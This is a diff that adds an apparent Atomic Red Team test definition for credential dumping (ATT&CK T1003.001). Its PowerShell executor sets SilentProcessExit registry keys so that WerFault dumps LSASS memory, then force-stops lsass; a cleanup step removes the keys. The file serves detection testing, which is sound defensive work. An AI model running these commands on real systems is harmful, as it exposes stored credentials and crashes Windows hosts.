@@ -1,0 +1,19 @@
+attack_technique: T1003.001
+display_name: Werfault.exe Utilizing SilentProcessExit to Dump lsass
+atomic_tests:
+- name: Werfault.exe Utilizing SilentProcessExit to Dump lsass
+  auto_generated_guid: 663f0831-162d-4002-922f-ef20fe0d9da8
+  description: changes within the Windows Registry under (Image File Execution Options\lsass.exe) which indicate the utilization of werfault.exe to dump LSASS process, by configuring the SilentProcessExit mechanism
+  supported_platforms:
+  - windows
+
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
+      reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe" /v ReportingMode /t REG_DWORD /d 2 /f
+      Stop-Process -processname lsass -Force
+    cleanup_command: |
+      Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe" -Force -ErrorAction SilentlyContinue
+      Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe" -Force -ErrorAction SilentlyContinue
